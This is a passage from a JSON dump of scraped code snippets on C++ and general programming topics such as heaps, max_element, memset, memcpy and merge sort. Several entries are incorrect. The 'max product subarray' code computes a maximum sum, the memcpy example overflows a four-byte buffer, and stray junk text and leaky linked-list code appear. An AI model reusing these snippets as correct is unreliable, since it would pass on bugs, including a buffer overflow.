    "description": "priority_queue <int, vector<int>, greater<int>> minHeap;\npriority_queue <int> maxHeap; \n// C++ program to show that priority_queue is by  // default a Max Heap  #include <bits/stdc++.h>  using namespace std;   // Driver code  int main ()  {  \t// Creates a max heap  \tpriority_queue <int> pq;  \tpq.push(5);  \tpq.push(1);  \tpq.push(10);  \tpq.push(30);  \tpq.push(20);   \t// One by one extract items from max heap  \twhile (pq.empty() == false)  \t{  \t\tcout << pq.top() << \" \";  \t\tpq.pop();  \t}   \treturn 0;  }  \npriority_queue <int, vector<int>, greater<int> > pq;\n#include <iostream> using namespace std; void max_heap(int *a, int m, int n) {    int j, t;    t = a[m];    j = 2 * m;    while (j <= n) {       if (j < n && a[j+1] > a[j])          j = j + 1;       if (t > a[j])          break;       else if (t <= a[j]) {          a[j / 2] = a[j];          j = 2 * j;       }    }    a[j/2] = t;    return; } void build_maxheap(int *a,int n) {    int k;    for(k = n/2; k >= 1; k--) {       max_heap(a,k,n);    } } int main() {    int n, i;    cout<<\"enter no of elements of array\\n\";    cin>>n;    int a[30];    for (i = 1; i <= n; i++) {       cout<<\"enter elements\"<<\" \"<<(i)<<endl;       cin>>a[i];    }    build_maxheap(a,n);    cout<<\"Max Heap\\n\";    for (i = 1; i <= n; i++) {       cout<<a[i]<<endl;    } }\n",
    "reg_date": "2021-10-12T11:42:06.000Z"
  },
  {
    "id": 3058,
    "keyword": null,
    "link": null,
    "title": " max of a vector c++",
    "description": "*max_element(a.begin(), a.end()); \nauto max = *max_element(vector.begin(), vector.end());\ncout<<*max_element(a.begin(), a.end())<<endl;\nint main()  {      // Get the vector      vector<int> a = { 1, 45, 54, 71, 76, 12 };         // Print the vector      cout << \"Vector: \";      for (int i = 0; i < a.size(); i++)          cout << a[i] << \" \";      cout << endl;         // Find the max element      cout << \"\\nMax Element = \"          << *max_element(a.begin(), a.end());      return 0;  } \n#include <iostream> #include <algorithm>  template <typename T, size_t N> const T* mybegin(const T (&a)[N]) { return a; }     template <typename T, size_t N> const T* myend  (const T (&a)[N]) { return a+N; }  int main() {     const int cloud[] = { 1,2,3,4,-7,999,5,6 };      std::cout << *std::max_element(mybegin(cloud), myend(cloud)) << '\\n';     std::cout << *std::min_element(mybegin(cloud), myend(cloud)) << '\\n'; }\nauto it = max_element(std::begin(cloud), std::end(cloud)); // c++11\n",
    "reg_date": "2021-10-12T11:42:06.000Z"
  },
  {
    "id": 3059,
    "keyword": null,
    "link": null,
    "title": " max pooling in c++",
    "description": "for (size_t y = 0; y < out_height; ++y) {     for (size_t x = 0; x < out_width; ++x) {         for (size_t i = 0; i < pool_y; ++i) {             for (size_t j = 0; j < pool_x; ++j) {                 for (size_t c = 0; c < depth; ++c) {                     float value = in[y * pool_y + i][x * pool_x + j][c];                     out[y][x][c] = max(out[y][x][c], value);                 }             }         }     } } \n",
    "reg_date": "2021-10-12T11:42:06.000Z"
  },
  {
    "id": 3060,
    "keyword": null,
    "link": null,
    "title": " max product subarray leetcode",
    "description": "Input: [2,3,-2,4] Output: 6 Explanation: [2,3] has the largest product 6. \ndef approach3(nums):     ans = nums[0]     subarr_sum = nums[0]      for i in range(1, len(nums)):         subarr_sum = max(nums[i], nums[i] + subarr_sum)         ans = max(ans, subarr_sum)      return ans \n",
    "reg_date": "2021-10-12T11:42:06.000Z"
  },
  {
    "id": 3061,
    "keyword": null,
    "link": null,
    "title": " max three values c++",
    "description": "    int a = 1;     int b = 2;     int c = 3;      int m = std::max({a, b, c});\n",
    "reg_date": "2021-10-12T11:42:06.000Z"
  },
  {
    "id": 3062,
    "keyword": null,
    "link": null,
    "title": " max two numbers c++",
    "description": "template <class T> inline T max(T a, T b) {    return a > b ? a : b; } //Example: max(2,5) = 5\n",
    "reg_date": "2021-10-12T11:42:07.000Z"
  },
  {
    "id": 3063,
    "keyword": null,
    "link": null,
    "title": " max value of double c++",
    "description": "short: min: -32768 max: 32767 int: min: -2147483648 max: 2147483647 long: min: -2147483648 max: 2147483647 float: min: 1.17549e-038 max: 3.40282e+038 double: min: 2.22507e-308 max: 1.79769e+308 long double: min: 2.22507e-308 max: 1.79769e+308 unsigned short: min: 0 max: 65535 unsigned int: min: 0 max: 4294967295 unsigned long: ...\nstd::numeric_limits<double>::max()\n",
    "reg_date": "2021-10-12T11:42:07.000Z"
  },
  {
    "id": 3064,
    "keyword": null,
    "link": null,
    "title": " maximum element in a binary tree",
    "description": "#include<iostream> using namespace std; struct node {     int data;     node* left;     node* right; }; node* getnode(int value) {     node* temp=new node;     temp->data=value;     temp->left=NULL;     temp->right=NULL;     return temp; } node* insert_bst(node* roots,int value) {     if(roots==NULL)     {         return getnode(value);     }     if(roots->data>value)     {         roots->left=insert_bst(roots->left,value);     }     else if(roots->data<value)     {         roots->right=insert_bst(roots->right,value);     }    return roots; } int max_element_bst(node* roots) {      if(roots==NULL)     {         return -1;     }     if(roots->right==NULL)     {         return roots->data;     }     else     {         return max_element_bst(roots->right);     } } int main() {     node* root=new node;     root=NULL;     int value;     do     {         cin>>value;         if(value>0)         {             root=insert_bst(root,value);         }     }while(value>0);     cout<<\"Maximum element is \"<<max_element_bst(root)<<endl; } \n",
    "reg_date": "2021-10-12T11:42:07.000Z"
  },
  {
    "id": 3065,
    "keyword": null,
    "link": null,
    "title": " maximum in vector",
    "description": "*max_element(a.begin(), a.end()); \n",
    "reg_date": "2021-10-12T11:42:07.000Z"
  },
  {
    "id": 3066,
    "keyword": null,
    "link": null,
    "title": " maximum int c++",
    "description": "#include <limits>  int imin = std::numeric_limits<int>::min(); // minimum value int imax = std::numeric_limits<int>::max(); // maximum value (2147483647)\n2147483647   unsigned long long int = 18 446 744 073 709 551 615\nx = 1, y  = 2; fmax(x , y); //if you want to print it right away: cout << fmax(x , y); //if you want to store it: int j = fmax(x, y); cout << j;  //output 2\n",
    "reg_date": "2021-10-12T11:42:07.000Z"
  },
  {
    "id": 3067,
    "keyword": null,
    "link": null,
    "title": " maximum value in map in c++",
    "description": "auto x = std::max_element(m.begin(), m.end(),     [](const pair<int, int>& p1, const pair<int, int>& p2) {         return p1.second < p2.second; }); \n#include <bits/stdc++.h> using namespace std;  bool compare(const pair<int, int>&a, const pair<int, int>&b) {    return a.second<b.second; }  int main(int argc, char const *argv[]) {    int n, key, maxn;    map<int,int> mp;     cin>>n;     for (int i=0; i<n; i++)    {      cin>>key;      mp[key]++;    }     maxn = max_element(mp.begin(), mp.end(), compare)->second;     cout<<maxn<<endl;     return 0;  } \n",
    "reg_date": "2021-10-12T11:42:07.000Z"
  },
  {
    "id": 3068,
    "keyword": null,
    "link": null,
    "title": " member initializer list in c++",
    "description": "// Constructor Member Initializer List  #include <iostream>  class Example { private:     int x, y;  public:     Example() : x(0), y(0) {}     Example(int x1, int y1) : x(x1), y(y1) {}     ~Example() {} };  int main() {     Example e; }\nstruct S {     int n;     S(int); // constructor declaration     S() : n(7) {} // constructor definition.                   // \": n(7)\" is the initializer list };  S::S(int x) : n{x} {} // constructor definition. \": n{x}\" is the initializer list  int main() {     S s; // calls S::S()     S s2(10); // calls S::S(int) }\n#include <iostream> class Entity { private :  \tstd::string m_Name; \tint m_Score; \tint x, y, z; public: \tEntity() \t\t:m_Name(\"[Unknown]\"),m_Score(0),x(0),y(0),z(0)//initialize in the order of how var are declared \t{ \t} \tEntity (const std::string& name)  \t\t:m_Name(name) \t{} \tconst std::string& GetName() const { return m_Name; }; }; int main() { \tEntity e1; \tstd::cout << e1.GetName() << std::endl; \tEntity e2(\"Caleb\"); \tstd::cout << e2.GetName() << std::endl; \tstd::cin.get(); }\nclass Something { private:     int m_value1;     double m_value2;     char m_value3;   public:     Something()     {         // These are all assignments, not initializations         m_value1 = 1;         m_value2 = 2.2;         m_value3 = 'c';     } }; \nclass Example { public: \tint m_A, m_B, m_C; \tExample(int a, int b, int c); };  Example::Example(int a, int b, int c): \t// This is an initializer list \tm_A(a), \tm_B(b), \tm_C(c) { /* Constructor code */ } \t\n",
    "reg_date": "2021-10-12T11:42:07.000Z"
  },
  {
    "id": 3069,
    "keyword": null,
    "link": null,
    "title": " memcpy c++ usage",
    "description": "#include<cstring> // or string.h int main(){ \tchar a[4],b[]={\"hello\"};   \tmemcpy(a,b,strlen(b)*sizeof(char));//destination,source,size*sizeof(type)   \t }\n#include <cstring>\n",
    "reg_date": "2021-10-12T11:42:07.000Z"
  },
  {
    "id": 3070,
    "keyword": null,
    "link": null,
    "title": " memcpy library cpp",
    "description": "#include <cstring>\n",
    "reg_date": "2021-10-12T11:42:07.000Z"
  },
  {
    "id": 3071,
    "keyword": null,
    "link": null,
    "title": " memmove",
    "description": "/* memmove example */ #include <stdio.h> #include <string.h>  int main () {   char str[] = \"memmove can be very useful......\";   memmove (str+20,str+15,11);   puts (str);   return 0; }\n",
    "reg_date": "2021-10-12T11:42:07.000Z"
  },
  {
    "id": 3072,
    "keyword": null,
    "link": null,
    "title": " memoization fibonacci c++",
    "description": "#include <map>  int fibonacci(int n, std::map<int, int> values) {   if (n==0 || n==1)     return n;   std::map<int,int>::iterator iter = values.find(n);   if (iter == values.end())   {     return values[n] = fibonacci(n-1) + fibonacci(n-2);   }   else   {     return iter->second;   } } \n#include <map>  int fibonacci(int n) {   static std::map<int, int> values;   if (n==0 || n==1)     return n;   std::map<int,int>::iterator iter = values.find(n);   if (iter == values.end())   {     return values[n] = fibonacci(n-1) + fibonacci(n-2);   }   else   {     return iter->second;   } } \n",
    "reg_date": "2021-10-12T11:42:08.000Z"
  },
  {
    "id": 3073,
    "keyword": null,
    "link": null,
    "title": " memset",
    "description": "/* memset example */ #include <stdio.h> #include <string.h>  int main () {   char str[] = \"almost every programmer should know memset!\";   memset (str,'-',6);   puts (str);   return 0; }  // Output: // ------ every programmer should know memset!\n// memset syntax void * memset ( void * ptr, int value, size_t num );\n",
    "reg_date": "2021-10-12T11:42:08.000Z"
  },
  {
    "id": 3074,
    "keyword": null,
    "link": null,
    "title": " memset array bool",
    "description": "//Array declaration bool arr[10];  //To initialize all the elements to true  memset(arr,1,sizeof(arr));\n",
    "reg_date": "2021-10-12T11:42:08.000Z"
  },
  {
    "id": 3075,
    "keyword": null,
    "link": null,
    "title": " memset c++",
    "description": "/* memset example */ #include <stdio.h> #include <string.h>  int main () {   char str[] = \"almost every programmer should know memset!\";   memset (str,'-',6);   puts (str);   return 0; }  // Output: // ------ every programmer should know memset!\n#include <cstring> memset(a, 0, sizeof(a));\nmemset(a, 0, sizeof(a))  memset(str, '#', sizeof(str)); \n/* memset example */ #include <stdio.h> #include <string.h>  int main () {   char str[] = \"almost every programmer should know memset!\";   memset (str,'-',6);   puts (str);   return 0; }  Output: ------ every programmer should know memset!\n// memset syntax void * memset ( void * ptr, int value, size_t num );\nasdad\n",
    "reg_date": "2021-10-12T11:42:08.000Z"
  },
  {
    "id": 3076,
    "keyword": null,
    "link": null,
    "title": " memset in c++",
    "description": "/* memset example */ #include <stdio.h> #include <string.h>  int main () {   char str[] = \"almost every programmer should know memset!\";   memset (str,'-',6);   puts (str);   return 0; }  // Output: // ------ every programmer should know memset!\n#include <cstring> memset(a, 0, sizeof(a));\nmemset(a, 0, sizeof(a))  memset(str, '#', sizeof(str)); \n/* memset example */ #include <stdio.h> #include <string.h>  int main () {   char str[] = \"almost every programmer should know memset!\";   memset (str,'-',6);   puts (str);   return 0; }  Output: ------ every programmer should know memset!\n// memset syntax void * memset ( void * ptr, int value, size_t num );\nasdad\n",
    "reg_date": "2021-10-12T11:42:08.000Z"
  },
  {
    "id": 3077,
    "keyword": null,
    "link": null,
    "title": " memset in cpp",
    "description": "#include <iostream> using namespace std; int main(){    //Pointer declaration    int *p, var=101;      //Assignment    p = &var;     cout<<\"Address of var: \"<<&var<<endl;    cout<<\"Address of var: \"<<p<<endl;    cout<<\"Address of p: \"<<&p<<endl;    cout<<\"Value of var: \"<<*p;    return 0; }\n#include <cstring> memset(a, 0, sizeof(a));\nmemset(a, 0, sizeof(a))  memset(str, '#', sizeof(str)); \n/* memset example */ #include <stdio.h> #include <string.h>  int main () {   char str[] = \"almost every programmer should know memset!\";   memset (str,'-',6);   puts (str);   return 0; }  Output: ------ every programmer should know memset!\nasdad\n/* memset example */ #include <stdio.h> #include <string.h>  int main () {   char str[] = \"almost every programmer should know memset!\";   memset (str,'-',6);   puts (str);   return 0; }\n",
    "reg_date": "2021-10-12T11:42:08.000Z"
  },
  {
    "id": 3078,
    "keyword": null,
    "link": null,
    "title": " menu driven program to delete in linked list",
    "description": "#include <iostream>  using namespace std; class node { public:     int data;     node*next; }; node*head=NULL; void insertlist(int val) {     node*temp=new node;     temp->data=val;     if(head==NULL)     {         temp->next=head;         head=temp;     }     else     {         temp->next=head;         head=temp;     } } void delete_start() {     if(head==NULL)     {         cout<<\"no element in the list :: nothing to be deleted:\"<<endl;     }     else     {         node*temp=new node;         temp=head;         head=head->next;         delete(temp);     } } void delete_end() {     if(head==NULL)     {          cout<<\"no element in the list :: nothing to be deleted:\"<<endl;     }     else     {         node *temp=new node;         temp=head;         node*ptr=new node;         while(temp->next->next!=NULL)         {             temp=temp->next;         }         ptr=temp->next;         temp->next=NULL;         delete ptr;       } } void delete_any(int val) {     node*temp=new node;     if(head==NULL)     {          cout<<\"no element in the list :: nothing to be deleted:\"<<endl;     }     else     {         if(head->data==val)         {             temp=head;             head=head->next;             delete temp;         }         else         {             node*ptr=new node;             ptr=head;             while(ptr->next!=NULL)             {                 if(ptr->next->data==val)                 {                     temp=ptr->next;                     ptr->next=ptr->next->next;                     delete temp;                 }                 ptr=ptr->next;              }         }     }  } void printf() {     node*temp=new node;     temp=head;     while(temp!=NULL)     {         cout<<temp->data<<\" \";         temp=temp->next;     }     cout<<endl; } int main() {     int n;     int t;     cin>>t;     while(t--)     {     cout<<\"enter the value to be inserted in the list:\"<<endl;     cin>>n;     insertlist(n);     }     printf();     int s;     while(1)     {         cout<<\"1-delete from the start\"<<endl<<\"2-delete from the end\"<<endl<<\"3-delete any element\"<<endl<<\"4-exit\"<<endl;         cout<<\"enter your choice:\"<<endl;         cin>>s;         switch(s)             {             case 1:                 {                    delete_start();                    printf();                    break;                 }             case 2:                 {                     delete_end();                     printf();                     break;                 }             case 3:                 {                     int a;                     printf();                     cout<<\"enter the value to be deleted:\"<<endl;                     cin>>a;                     delete_any(a);                     printf();                     break;                 }             case 4:                 {                     exit(0);                 }             default:                 {                     cout<<\"invalid opertaion:\"<<endl;                 }             }      }     return 0; } \n",
    "reg_date": "2021-10-12T11:42:08.000Z"
  },
  {
    "id": 3079,
    "keyword": null,
    "link": null,
    "title": " merge images opencv c++",
    "description": "#include <opencv2\\opencv.hpp> using namespace cv;  int main() {     // Load images     Mat3b img1 = imread(\"path_to_image_1\");     Mat3b img2 = imread(\"path_to_image_2\");      // Get dimension of final image     int rows = max(img1.rows, img2.rows);     int cols = img1.cols + img2.cols;      // Create a black image     Mat3b res(rows, cols, Vec3b(0,0,0));      // Copy images in correct position     img1.copyTo(res(Rect(0, 0, img1.cols, img1.rows)));     img2.copyTo(res(Rect(img1.cols, 0, img2.cols, img2.rows)));      // Show result     imshow(\"Img 1\", img1);     imshow(\"Img 2\", img2);     imshow(\"Result\", res);     waitKey();      return 0; } \n",
    "reg_date": "2021-10-12T11:42:08.000Z"
  },
  {
    "id": 3080,
    "keyword": null,
    "link": null,
    "title": " merge sort",
    "description": "MergeSort(arr[], l,  r) If r > l      1. Find the middle point to divide the array into two halves:                middle m = l+ (r-l)/2      2. Call mergeSort for first half:                 Call mergeSort(arr, l, m)      3. Call mergeSort for second half:              Call mergeSort(arr, m+1, r)      4. Merge the two halves sorted in step 2 and 3:              Call merge(arr, l, m, r)\n//merge sort #include <iostream>  using namespace std; void merge(int arr[],int start,int mid,int end) {     int n1=mid-start+1;     int n2=end-mid;     int l[n1],m[n2];     for(int i=0;i<n1;i++)     {         l[i]=arr[start+i];     }     for(int j=0;j<n2;j++)     {         m[j]=arr[mid+1+j];     }     int i=0;     int j=0;     int k=start;     while(i<n1&&j<n2)     {         if(l[i]<m[j])         {             arr[k]=l[i];             k++;             i++;         }         else         {             arr[k]=m[j];             k++;             j++;         }     }     while(i<n1)     {         arr[k]=l[i];         k++;         i++;     }     while(j<n2)     {         arr[k]=m[j];         k++;         j++;     } } void mergesort(int arr[],int start,int end) {     if(start<end)     {         int mid=(start+end)/2;         mergesort(arr,start,mid);         mergesort(arr,mid+1,end);         merge(arr,start,mid,end);     } } void display(int arr[],int n) {     for(int i=0;i<n;i++)     {         cout<<arr[i]<<\" \";     }     cout<<endl; }  int main() {     int n;     cout<<\"enter the size of the array:\"<<endl;     cin>>n;     cout<<\"enter the elements of the array:\"<<endl;     int arr[n];     for(int i=0;i<n;i++)     {         cin>>arr[i];     }     cout<<\"array as it is:\"<<endl;     display(arr,n);     cout<<\"sorted array:\"<<endl;     mergesort(arr,0,n-1);     display(arr,n);     return 0; } \nclass Sort  {     void merge(int arr[], int left, int middle, int right)     {         int low = middle - left + 1;                    //size of the left subarray         int high = right - middle;                      //size of the right subarray           int L[] = new int[low];                             //create the left and right subarray         int R[] = new int[high];          int i = 0, j = 0;           for (i = 0; i < low; i++)                               //copy elements into left subarray         {             L[i] = arr[left + i];         }         for (j = 0; j < high; j++)                              //copy elements into right subarray         {             R[j] = arr[middle + 1 + j];         }                    int k = left;                                           //get starting index for sort         i = 0;                                             //reset loop variables before performing merge         j = 0;          while (i < low && j < high)                     //merge the left and right subarrays         {             if (L[i] <= R[j])              {                 arr[k] = L[i];                 i++;             }             else              {                 arr[k] = R[j];                 j++;             }             k++;         }           while (i < low)                             //merge the remaining elements from the left subarray         {             arr[k] = L[i];             i++;             k++;         }           while (j < high)                           //merge the remaining elements from right subarray         {             arr[k] = R[j];             j++;             k++;         }     }        void mergeSort(int arr[], int left, int right)       //helper function that creates the sub cases for sorting     {         int middle;         if (left < right) {                             //sort only if the left index is lesser than the right index (meaning that sorting is done)             middle = (left + right) / 2;               mergeSort(arr, left, middle);                    //left subarray             mergeSort(arr, middle + 1, right);               //right subarray               merge(arr, left, middle, right);                //merge the two subarrays         }     }       void display(int arr[])                 //display the array     {           for (int i=0; i<arr.length; ++i)          {             System.out.print(arr[i]+\" \");         }      }       public static void main(String args[])     {         int arr[] = { 9, 3, 1, 5, 13, 12 };         Sort ob = new Sort();         ob.mergeSort(arr, 0, arr.length - 1);         ob.display(arr);     } } \n// @see https://www.youtube.com/watch?v=es2T6KY45cA&vl=en // @see https://www.cs.usfca.edu/~galles/visualization/ComparisonSort.html  function merge(list, start, midpoint, end) {     const left = list.slice(start, midpoint);     const right = list.slice(midpoint, end);     for (let topLeft = 0, topRight = 0, i = start; i < end; i += 1) {         if (topLeft >= left.length) {             list[i] = right[topRight++];         } else if (topRight >= right.length) {             list[i] = left[topLeft++];         } else if (left[topLeft] < right[topRight]) {             list[i] = left[topLeft++];         } else {             list[i] = right[topRight++];         }     } }  function mergesort(list, start = 0, end = undefined) {     if (end === undefined) {         end = list.length;     }     if (end - start > 1) {         const midpoint = ((end + start) / 2) >> 0;         mergesort(list, start, midpoint);         mergesort(list, midpoint, end);         merge(list, start, midpoint, end);     }     return list; }  mergesort([4, 7, 2, 6, 4, 1, 8, 3]);\nvoid merge(int arr[], int l, int m, int r)     {          int n=r-l+1,temp[n];          int i=l,j=m+1,k=0;          while(i<=m and j<= r)          {              if(arr[i]< arr[j]){                 temp[k++] = arr[i++];              else                 temp[k++] = arr[j++];          }          while(i<=m)             temp[k++] = arr[i++];          while(j<=r)             temp[k++] = arr[j++];          int ind= 0;          for(int i=l;i<=m;i++)              arr[i] = temp[ind++];          for(int j=m+1;j<=r;j++)             arr[j] = temp[ind++];     }          void mergeSort(int arr[], int l, int r)     {        if(l<r)        {            int mid = (r+l)/2;            mergeSort(arr,l,mid);            mergeSort(arr,mid+1,r);            merge(arr,l,mid,r);        }     }\n# Python3 recursive merge sort algorithm -> O(n*log(n)) def merge_sort(A):     def merge(l, r):         i = j = 0         n = []  # merging container         while i < len(l) or j < len(r):              # if no more elements to the right,             # add remaining left elements             if i == len(l):                 n.extend(r[j:])                 break              # if no more elements to the left,             # add remaining right elements             if j == len(r):                 n.extend(l[i:])                 break              # if elements left on both sides,             # add smaller element             a, b = l[i], r[j]             if a < b:                 n.append(a)                 i += 1             else:                 n.append(b)                 j += 1          return n      # divide list down to single-elements     s = len(A)     if s > 1:         s //= 2         l = merge_sort(A[:s])  # split left         r = merge_sort(A[s:])  # split right         return merge(l, r)  # merge sides in order     else:         return A\nStep 1 &minus; if it is only one element in the list it is already sorted, return. Step 2 &minus; divide the list recursively into two halves until it can no more be divided. Step 3 &minus; merge the smaller lists into new list in sorted order. \nGiven array is  12 11 13 5 6 7  Sorted array is  5 6 7 11 12 13\n",
    "reg_date": "2021-10-12T11:42:08.000Z"
  },
  {
    "id": 3081,
    "keyword": null,
    "link": null,
    "title": " merge sort c++",
    "description": "#include <iostream> using namespace std;    void merge(int arr[], int l, int m, int r) {     int n1 = m - l + 1;     int n2 = r - m;         int L[n1], R[n2];           for (int i = 0; i < n1; i++)         L[i] = arr[l + i];     for (int j = 0; j < n2; j++)         R[j] = arr[m + 1 + j];        int i = 0;            int j = 0;            int k = l;       while (i < n1 && j < n2) {         if (L[i] <= R[j]) {             arr[k] = L[i];             i++;         }         else {             arr[k] = R[j];             j++;         }         k++;     }          while (i < n1) {         arr[k] = L[i];         i++;         k++;     }           while (j < n2) {         arr[k] = R[j];         j++;         k++;     } }    void mergeSort(int arr[],int l,int r){     if(l>=r){         return;     }     int m = (l+r-1)/2;     mergeSort(arr,l,m);     mergeSort(arr,m+1,r);     merge(arr,l,m,r); }    void printArray(int A[], int size) {     for (int i = 0; i < size; i++)         cout << A[i] << \" \"; }    int main() {     int arr[] = { 12, 11, 13, 5, 6, 7 };     int arr_size = sizeof(arr) / sizeof(arr[0]);       cout << \"Given array is \\n\";     printArray(arr, arr_size);       mergeSort(arr, 0, arr_size - 1);       cout << \"\\nSorted array is \\n\";     printArray(arr, arr_size);     return 0; }\n#include<iostream> using namespace std; void swapping(int &a, int &b) {     //swap the content of a and b    int temp;    temp = a;    a = b;    b = temp; } void display(int *array, int size) {    for(int i = 0; i<size; i++)       cout << array[i] << \" \";    cout << endl; } void merge(int *array, int l, int m, int r) {    int i, j, k, nl, nr;    //size of left and right sub-arrays    nl = m-l+1; nr = r-m;    int larr[nl], rarr[nr];    //fill left and right sub-arrays    for(i = 0; i<nl; i++)       larr[i] = array[l+i];    for(j = 0; j<nr; j++)       rarr[j] = array[m+1+j];    i = 0; j = 0; k = l;    //marge temp arrays to real array    while(i < nl && j<nr) {       if(larr[i] <= rarr[j]) {          array[k] = larr[i];          i++;       }else{          array[k] = rarr[j];          j++;       }       k++;    }    while(i<nl) {       //extra element in left array       array[k] = larr[i];       i++; k++;    }    while(j<nr) {     //extra element in right array       array[k] = rarr[j];       j++; k++;    } } void mergeSort(int *array, int l, int r) {    int m;    if(l < r) {       int m = l+(r-l)/2;       // Sort first and second arrays       mergeSort(array, l, m);       mergeSort(array, m+1, r);       merge(array, l, m, r);    } } int main() {    int n;    cout << \"Enter the number of elements: \";    cin >> n;    int arr[n];     //create an array with given number of elements    cout << \"Enter elements:\" << endl;    for(int i = 0; i<n; i++) {       cin >> arr[i];    }    cout << \"Array before Sorting: \";    display(arr, n);    mergeSort(arr, 0, n-1);     //(n-1) for last index    cout << \"Array after Sorting: \";    display(arr, n); }\n// @see https://www.youtube.com/watch?v=es2T6KY45cA&vl=en // @see https://www.cs.usfca.edu/~galles/visualization/ComparisonSort.html  function merge(list, start, midpoint, end) {     const left = list.slice(start, midpoint);     const right = list.slice(midpoint, end);     for (let topLeft = 0, topRight = 0, i = start; i < end; i += 1) {         if (topLeft >= left.length) {             list[i] = right[topRight++];         } else if (topRight >= right.length) {             list[i] = left[topLeft++];         } else if (left[topLeft] < right[topRight]) {             list[i] = left[topLeft++];         } else {             list[i] = right[topRight++];         }     } }  function mergesort(list, start = 0, end = undefined) {     if (end === undefined) {         end = list.length;     }     if (end - start > 1) {         const midpoint = ((end + start) / 2) >> 0;         mergesort(list, start, midpoint);         mergesort(list, midpoint, end);         merge(list, start, midpoint, end);     }     return list; }  mergesort([4, 7, 2, 6, 4, 1, 8, 3]);\ndef mergeSort(arr):      if len(arr) >1:          mid = len(arr)//2 # Finding the mid of the array          L = arr[:mid] # Dividing the array elements           R = arr[mid:] # into 2 halves             mergeSort(L) # Sorting the first half          mergeSort(R) # Sorting the second half             i = j = k = 0                    # Copy data to temp arrays L[] and R[]          while i < len(L) and j < len(R):              if L[i] < R[j]:                  arr[k] = L[i]                  i+= 1             else:                  arr[k] = R[j]                  j+= 1             k+= 1                    # Checking if any element was left          while i < len(L):              arr[k] = L[i]              i+= 1             k+= 1                    while j < len(R):              arr[k] = R[j]              j+= 1             k+= 1    # Code to print the list  def printList(arr):      for i in range(len(arr)):                  print(arr[i], end =\" \")      print()     # driver code to test the above code  if __name__ == '__main__':      arr = [12, 11, 13, 5, 6, 7]       print (\"Given array is\", end =\"\\n\")       printList(arr)      mergeSort(arr)      print(\"Sorted array is: \", end =\"\\n\")      printList(arr)\n/*       a[] is the array, p is starting index, that is 0,      and r is the last index of array.  */  #include <stdio.h>  // lets take a[5] = {32, 45, 67, 2, 7} as the array to be sorted.  // merge sort function void mergeSort(int a[], int p, int r) {     int q;     if(p < r)     {         q = (p + r) / 2;         mergeSort(a, p, q);         mergeSort(a, q+1, r);         merge(a, p, q, r);     } }  // function to merge the subarrays void merge(int a[], int p, int q, int r) {     int b[5];   //same size of a[]     int i, j, k;     k = 0;     i = p;     j = q + 1;     while(i <= q && j <= r)     {         if(a[i] < a[j])         {             b[k++] = a[i++];    // same as b[k]=a[i]; k++; i++;         }         else         {             b[k++] = a[j++];         }     }        while(i <= q)     {         b[k++] = a[i++];     }        while(j <= r)     {         b[k++] = a[j++];     }        for(i=r; i >= p; i--)     {         a[i] = b[--k];  // copying back the sorted list to a[]     }  }  // function to print the array void printArray(int a[], int size) {     int i;     for (i=0; i < size; i++)     {         printf(\"%d \", a[i]);     }     printf(\"\\n\"); }   int main() {     int arr[] = {32, 45, 67, 2, 7};     int len = sizeof(arr)/sizeof(arr[0]);       printf(\"Given array: \\n\");     printArray(arr, len);          // calling merge sort     mergeSort(arr, 0, len - 1);       printf(\"\\nSorted array: \\n\");     printArray(arr, len);     return 0; }\n#include \"tools.hpp\" /*   >>>>>>>> (Recursive function that sorts a sequence of) <<<<<<<<<<<<       >>>>>>>> (numbers in ascending order using the merge function) <<<<                                 */ std::vector<int> sort(size_t start, size_t length, const std::vector<int>& vec) { \tif(vec.size()==0 ||vec.size() == 1) \treturn vec;  \tvector<int> left,right; //===>  creating left and right vectors   \tsize_t mid_point = vec.size()/2; //===>   midle point between the left vector and the right vector   \tfor(int i = 0 ; i < mid_point; ++i){left.emplace_back(vec[i]);} //===>  left vector  \tfor(int j = mid_point; j < length; ++j){ right.emplace_back(vec[j]);} //===>  right vector   \tleft = sort(start,mid_point,left); //===>  sorting the left vector  \tright = sort(mid_point,length-mid_point,right);//===>  sorting the right vector  \t  \treturn merge(left,right); //===>   all the function merge to merge between the left and the right } /*  >>>>> (function that merges two sorted vectors of numberss) <<<<<<<<<                                    */  vector<int> merge(const vector<int>& a, const vector<int>& b) { \tvector<int> merged_a_b(a.size()+b.size(),0); // temp vector that includes both left and right vectors \tint i = 0; \tint j = 0; \tint k = 0; \tint left_size = a.size(); \tint right_size = b.size(); \twhile(i<left_size && j<right_size)  \t{ \t\tif(a[i]<b[j]) \t\t{ \t\t\tmerged_a_b[k]=a[i]; \t\t\ti++; \t\t} \t\telse \t\t{ \t\t\tmerged_a_b[k]=b[j]; \t\t\tj++; \t\t} \t\tk++; \t} \twhile(i<left_size) \t{ \t\tmerged_a_b[k]=a[i]; \t\ti++; \t\tk++; \t} \twhile(j<right_size) \t{ \t\tmerged_a_b[k]=b[j]; \t\tj++; \t\tk++; \t} \t \treturn merged_a_b;  }\n",
    "reg_date": "2021-10-12T11:42:09.000Z"
  },
  {
    "id": 3082,
    "keyword": null,
    "link": null,
    "title": " merge sort c++ github",
    "description": "#include \"tools.hpp\" /*   >>>>>>>> (Recursive function that sorts a sequence of) <<<<<<<<<<<<       >>>>>>>> (numbers in ascending order using the merge function) <<<<                                 */ std::vector<int> sort(size_t start, size_t length, const std::vector<int>& vec) { \tif(vec.size()==0 ||vec.size() == 1) \treturn vec;  \tvector<int> left,right; //===>  creating left and right vectors   \tsize_t mid_point = vec.size()/2; //===>   midle point between the left vector and the right vector   \tfor(int i = 0 ; i < mid_point; ++i){left.emplace_back(vec[i]);} //===>  left vector  \tfor(int j = mid_point; j < length; ++j){ right.emplace_back(vec[j]);} //===>  right vector   \tleft = sort(start,mid_point,left); //===>  sorting the left vector  \tright = sort(mid_point,length-mid_point,right);//===>  sorting the right vector  \t  \treturn merge(left,right); //===>   all the function merge to merge between the left and the right } /*  >>>>> (function that merges two sorted vectors of numberss) <<<<<<<<<                                    */  vector<int> merge(const vector<int>& a, const vector<int>& b) { \tvector<int> merged_a_b(a.size()+b.size(),0); // temp vector that includes both left and right vectors \tint i = 0; \tint j = 0; \tint k = 0; \tint left_size = a.size(); \tint right_size = b.size(); \twhile(i<left_size && j<right_size)  \t{ \t\tif(a[i]<b[j]) \t\t{ \t\t\tmerged_a_b[k]=a[i]; \t\t\ti++; \t\t} \t\telse \t\t{ \t\t\tmerged_a_b[k]=b[j]; \t\t\tj++; \t\t} \t\tk++; \t} \twhile(i<left_size) \t{ \t\tmerged_a_b[k]=a[i]; \t\ti++; \t\tk++; \t} \twhile(j<right_size) \t{ \t\tmerged_a_b[k]=b[j]; \t\tj++; \t\tk++; \t} \t \treturn 